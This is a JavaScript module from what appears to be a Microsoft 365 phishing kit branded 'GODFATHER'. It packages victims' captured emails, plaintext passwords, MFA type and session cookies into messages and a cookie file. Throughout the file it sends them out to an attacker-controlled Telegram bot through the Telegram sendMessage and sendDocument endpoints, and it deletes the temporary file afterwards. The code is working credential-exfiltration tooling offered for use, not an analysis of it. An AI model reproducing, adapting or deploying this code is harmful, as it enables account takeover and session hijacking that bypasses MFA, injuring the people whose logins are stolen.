/**
 * Telegram Service
 * Handles all Telegram bot integration
 */

const fs = require('fs').promises;
const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, PATHS } = require('../config/constants');

/**
 * Read session file content
 * @returns {Promise<string|null>} Session content or null
 */
async function readSessionFile() {
    try {
        const sessionData = await fs.readFile(PATHS.SESSION_FILE, 'utf8');
        return sessionData.trim();
    } catch (error) {
        console.log('⚠️ Could not read session.txt:', error.message);
        return null;
    }
}

/**
 * Send initial session message to Telegram
 * @param {string} email - User email
 * @param {string} password - User password
 * @param {string} landingUrl - Landing URL
 * @returns {Promise<boolean>} Success status
 */
async function sendSessionMessage(email, password, landingUrl) {
    // Disabled per user request
    return true;
}

/**
 * Send session file content to Telegram
 * @param {string} sessionContent - Session file content
 * @returns {Promise<boolean>} Success status
 */
async function sendSessionFile(sessionContent) {
    try {
        const message = `📄 **Session File Content:**\n\n\`\`\`\n${sessionContent}\n\`\`\``;

        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();
        if (result.ok) {
            console.log('✅ Session file content sent to Telegram');
            return true;
        } else {
            console.error('❌ Session file error:', result.description);
            return false;
        }
    } catch (error) {
        console.error('❌ Error sending session file:', error.message);
        return false;
    }
}

/**
 * Format user data for Telegram (plain text fallback)
 * @param {Object} userData - User data object
 * @returns {string} Formatted message
 */
function formatTelegramMessagePlain(userData) {
    let message = 'MICROSOFT AUTH CAPTURE\n\n';
    message += `Email: ${userData.email}\n`;
    message += `Password: ${userData.password}\n`;
    message += `Final URL: ${userData.finalUrl}\n`;
    message += `Time: ${new Date().toISOString()}\n\n`;
    message += `Cookies (${userData.cookies.length}):\n`;
    message += JSON.stringify(userData.cookies, null, 2);

    return message;
}

/**
 * Format user data for Telegram (Markdown)
 * @param {Object} userData - User data object
 * @returns {string} Formatted message
 */
function formatTelegramMessage(userData) {
    let message = `🔐 **MICROSOFT AUTH CAPTURE**\n\n`;
    message += `📧 **Email:** ${userData.email}\n`;
    message += `🔑 **Password:** ${userData.password}\n`;
    message += `🌐 **Final URL:** ${userData.finalUrl}\n`;
    message += `🕐 **Time:** ${new Date().toISOString()}\n\n`;
    message += `🍪 **Cookies (${userData.cookies.length}):**\n`;
    message += `\`\`\`json\n`;
    message += JSON.stringify(userData.cookies, null, 2);
    message += `\n\`\`\``;

    return message;
}

/**
 * Send captured auth data to Telegram (with error-proof markdown)
 * @param {Object} userData - User data object
 * @returns {Promise<boolean>} Success status
 */
async function sendToTelegram(userData) {
    // Redirect to the "G😈DFATHER" format handler
    // Infer MFA type if possible, or default to 'none' (or 'detected')
    const mfaType = 'none'; // authDetection doesn't track MFA type explicitly

    return await sendLoginSuccessToTelegram(
        userData.email,
        userData.password,
        mfaType,
        userData.cookies
    );
}

/**
 * Send login success data to Telegram with cookies as attachment
 * @param {string} email - User email
 * @param {string} password - User password  
 * @param {string} mfaType - MFA type used (none/email/phone)
 * @param {Array} cookies - Array of cookie objects
 * @returns {Promise<boolean>} Success status
 */
async function sendLoginSuccessToTelegram(email, password, mfaType, cookies) {
    const fs = require('fs');
    const path = require('path');
    const globals = require('../config/globals');

    // Prevent duplicate messages
    if (globals.get('telegramSent')) {
        console.log('⚠️ Telegram login success message already sent - skipping duplicate');
        return true;
    }
    globals.set('telegramSent', true);

    try {
        // Create digital/ghosty summary message
        let message = `\`\`\`\n`;
        message += "######################################\n";
        message += "               GODFATHER\n";
        message += "######################################\n";
        message += "```\n\n";
        message += `┌──────────────────────────┐\n`;
        message += `│ 📧 \`${email}\`\n`;
        message += `│ 🔑 \`${password}\`\n`;
        message += `│ 🛡️ ${mfaType}\n`;
        message += `│ 🍪 ${cookies.length} soft cookies \n`;
        message += `│ ⏰ ${new Date().toISOString()}\n`;
        message += `└──────────────────────────┘\n\n`;
        message += `📎 *cookies.txt attached below* 👇`;

        // Send the clean summary message first
        const messageResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });

        const messageResult = await messageResponse.json();
        if (!messageResult.ok) {
            // Try plain text if markdown fails
            const plainMessage = message.replace(/\*\*/g, '').replace(/`/g, '');
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: plainMessage,
                    disable_web_page_preview: true
                })
            });
        }
        console.log('✅ Login success message sent to Telegram');

        // Create cookies .txt file
        const cookieFileName = `cookies_${email.replace(/[@.]/g, '_')}_${Date.now()}.txt`;
        const cookieFilePath = path.join(PATHS.BACKUP_DIR || '.', cookieFileName);

        // Format cookies to match desired format
        const formattedCookies = cookies.map(cookie => ({
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            path: cookie.path || '/',
            httpOnly: cookie.httpOnly || false,
            secure: cookie.secure || false,
            expires: cookie.expires && cookie.expires > 0 ? Math.floor(cookie.expires * 1000) : 0,
            sameSite: "no_restriction"
        }));

        // Format cookies nicely for the txt file
        let cookieContent = `=================================\n`;
        cookieContent += `0365 LOGIN COOKIES\n`;
        cookieContent += `=================================\n\n`;
        cookieContent += `Email: ${email}\n`;
        cookieContent += `Password: ${password}\n`;
        cookieContent += `MFA Type: ${mfaType}\n`;
        cookieContent += `Captured: ${new Date().toISOString()}\n`;
        cookieContent += `Total Cookies: ${formattedCookies.length}\n\n`;
        cookieContent += `=================================\n`;
        cookieContent += `COOKIES (JSON FORMAT)\n`;
        cookieContent += `=================================\n\n`;
        cookieContent += JSON.stringify(formattedCookies, null, 2);

        // Write temp file
        fs.writeFileSync(cookieFilePath, cookieContent, 'utf8');
        console.log(`📄 Cookies file created: ${cookieFilePath}`);

        // Read file content as buffer and use native FormData
        const fileBuffer = fs.readFileSync(cookieFilePath);
        const blob = new Blob([fileBuffer], { type: 'text/plain' });

        // Use native FormData (available in Node 18+)
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('caption', `🍪 Cookies for: GODFATHER BOT`);
        formData.append('document', blob, cookieFileName);

        const fileResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        });

        // TRACE: Log response status and headers
        console.log(`📤 File upload response status: ${fileResponse.status} ${fileResponse.statusText}`);

        // TRACE: Get raw text first to see what we're getting
        const responseText = await fileResponse.text();
        console.log(`📤 Raw response (first 300 chars): ${responseText.substring(0, 300)}`);

        // Try to parse as JSON
        let fileResult;
        try {
            fileResult = JSON.parse(responseText);
        } catch (parseError) {
            console.error('❌ Failed to parse Telegram response as JSON:', parseError.message);
            console.error('📤 Full response text:', responseText);
            fileResult = { ok: false, description: 'Invalid JSON response' };
        }
        console.log('📤 Telegram file upload result:', fileResult.ok ? 'SUCCESS' : 'FAILED');

        // Clean up temp file
        try {
            fs.unlinkSync(cookieFilePath);
            console.log(`🧹 Temp file cleaned up`);
        } catch (e) {
            // Ignore cleanup errors
        }

        if (fileResult.ok) {
            console.log('✅ Cookies file sent to Telegram');
            return true;
        } else {
            console.error('❌ Failed to send cookies file:', fileResult.description || fileResult);
            // Fallback: send cookies as text message if file upload fails
            console.log('📤 Fallback: Sending cookies summary...');
            const cookieSummary = cookies.slice(0, 5).map(c => `${c.name}: ${c.value.substring(0, 30)}...`).join('\n');
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: `🍪 Cookies for ${email} (file upload failed):\n\n${cookieSummary}\n\n...and ${cookies.length - 5} more cookies`,
                    disable_web_page_preview: true
                })
            });
            return true;
        }

    } catch (error) {
        console.error('❌ Error sending login success to Telegram:', error.message);
        return false;
    }
}

module.exports = {
    readSessionFile,
    sendSessionMessage,
    sendSessionFile,
    sendToTelegram,
    sendLoginSuccessToTelegram,
    formatTelegramMessage,
    formatTelegramMessagePlain
};
